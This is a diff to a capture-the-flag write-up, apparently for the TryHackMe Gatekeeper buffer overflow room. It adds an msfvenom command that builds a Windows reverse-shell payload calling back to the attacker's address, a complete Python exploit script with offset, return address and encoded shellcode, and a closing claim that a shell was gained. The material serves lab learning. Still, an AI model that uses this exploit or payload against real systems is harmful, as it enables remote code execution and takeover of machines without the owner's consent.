@@ -4,7 +4,7 @@
 
 ### Deploy Machine and Scan Network
 
-- ![image](https://user-images.githubusercontent.com/94720207/169636811-a9a34ab5-9d7f-42ec-a883-627f1ad94948.png))
+- ![image](https://user-images.githubusercontent.com/94720207/169709884-f10463c3-49fe-47b6-b23a-4c7b29199467.png)
 
 - ![image](https://user-images.githubusercontent.com/94720207/169636037-e216bbad-391c-496c-b461-0e2d65dc1b94.png)
 
@@ -722,23 +722,81 @@ except:
 - This final step is very easy, we only need to point agains the `Real Gatekeeper Server` instead my bare metal Windows 10 PC.
 
     - To do that, we only need to change the payload from `msfvenom` with another LHOST & LPORT poining my THM-VPN (instead my local  192.168.1.100/24) 
-    
-        - `msfvenom -p windows/shell_reverse_tcp LHOST=10.6.123.13 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x08\x2E\x2F\xA0\xA1" -f c`
+            
+        - `msfvenom -p windows/shell_reverse_tcp LHOST=10.6.123.13 LPORT=4444 EXITFUNC=thread -b "\x00\x0A" -f c` 
         
-        - ![image](https://user-images.githubusercontent.com/94720207/169681624-15e4e0b2-90c7-4871-95cc-cccdad11002c.png)
+        - ![image](https://user-images.githubusercontent.com/94720207/169709512-bfebae53-e35f-4ede-b886-b5581d060016.png)
      
-    - Also change the python script to pint the RHOST & RPORT of the OSCP Server (THM machine) 
+    - Also change the python script to pint the RHOST & RPORT of the Gatekeeper Server (THM machine)
     
+    - ![image](https://user-images.githubusercontent.com/94720207/169709901-11d9ff3d-f66d-4029-a146-7de47124ea14.png)
+      
         - ip = "10.10.25.92"
-        - port = 1337 
+        - port = 31337 
 
 - **Final Script:**
 
-    - **`overflow1_step666_fz3r0_kill_OSCP.py`**
+    - **`z_GATEKEEPER_FZ3R0_PWN_666.py`**
  
 ```python
+import socket
+
+ip = "10.10.5.62"
+port = 31337
+
+prefix = ""
+offset = 146
+overflow = "A" * offset
+retn = "\xC3\x14\x04\x08"
+padding = "\x90" * 16
+payload = ("\xbb\x45\xf0\x26\x18\xdd\xc1\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
+"\x52\x31\x58\x12\x83\xc0\x04\x03\x1d\xfe\xc4\xed\x61\x16\x8a"
+"\x0e\x99\xe7\xeb\x87\x7c\xd6\x2b\xf3\xf5\x49\x9c\x77\x5b\x66"
+"\x57\xd5\x4f\xfd\x15\xf2\x60\xb6\x90\x24\x4f\x47\x88\x15\xce"
+"\xcb\xd3\x49\x30\xf5\x1b\x9c\x31\x32\x41\x6d\x63\xeb\x0d\xc0"
+"\x93\x98\x58\xd9\x18\xd2\x4d\x59\xfd\xa3\x6c\x48\x50\xbf\x36"
+"\x4a\x53\x6c\x43\xc3\x4b\x71\x6e\x9d\xe0\x41\x04\x1c\x20\x98"
+"\xe5\xb3\x0d\x14\x14\xcd\x4a\x93\xc7\xb8\xa2\xe7\x7a\xbb\x71"
+"\x95\xa0\x4e\x61\x3d\x22\xe8\x4d\xbf\xe7\x6f\x06\xb3\x4c\xfb"
+"\x40\xd0\x53\x28\xfb\xec\xd8\xcf\x2b\x65\x9a\xeb\xef\x2d\x78"
+"\x95\xb6\x8b\x2f\xaa\xa8\x73\x8f\x0e\xa3\x9e\xc4\x22\xee\xf6"
+"\x29\x0f\x10\x07\x26\x18\x63\x35\xe9\xb2\xeb\x75\x62\x1d\xec"
+"\x7a\x59\xd9\x62\x85\x62\x1a\xab\x42\x36\x4a\xc3\x63\x37\x01"
+"\x13\x8b\xe2\x86\x43\x23\x5d\x67\x33\x83\x0d\x0f\x59\x0c\x71"
+"\x2f\x62\xc6\x1a\xda\x99\x81\x2e\x1d\xda\x5c\x47\x23\x1c\x4e"
+"\xcb\xaa\xfa\x1a\xe3\xfa\x55\xb3\x9a\xa6\x2d\x22\x62\x7d\x48"
+"\x64\xe8\x72\xad\x2b\x19\xfe\xbd\xdc\xe9\xb5\x9f\x4b\xf5\x63"
+"\xb7\x10\x64\xe8\x47\x5e\x95\xa7\x10\x37\x6b\xbe\xf4\xa5\xd2"
+"\x68\xea\x37\x82\x53\xae\xe3\x77\x5d\x2f\x61\xc3\x79\x3f\xbf"
+"\xcc\xc5\x6b\x6f\x9b\x93\xc5\xc9\x75\x52\xbf\x83\x2a\x3c\x57"
+"\x55\x01\xff\x21\x5a\x4c\x89\xcd\xeb\x39\xcc\xf2\xc4\xad\xd8"
+"\x8b\x38\x4e\x26\x46\xf9\x6e\xc5\x42\xf4\x06\x50\x07\xb5\x4a"
+"\x63\xf2\xfa\x72\xe0\xf6\x82\x80\xf8\x73\x86\xcd\xbe\x68\xfa"
+"\x5e\x2b\x8e\xa9\x5f\x7e")
+postfix = ""
+
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+  s.connect((ip, port))
+  print("Sending evil buffer...")
+  s.send(bytes(buffer + "\r\n", "latin-1"))
+  print("Done!")
+except:
+  print("Could not connect.")
 ```
 
+- ![image](https://user-images.githubusercontent.com/94720207/169709696-87d91e05-fb21-48de-9251-514b8770c053.png)
+
+- The final victory, time to the real attack against the Gatekeeper Server, execute script!!!:
+
+    - ![image](https://user-images.githubusercontent.com/94720207/169681957-eeddd076-a653-453c-8f94-e35b3b6b4508.png)
+
+- **Reverse shell with root privileges gained from OSCP Server!!! It's done! :D** 
+
+---
 
 
 
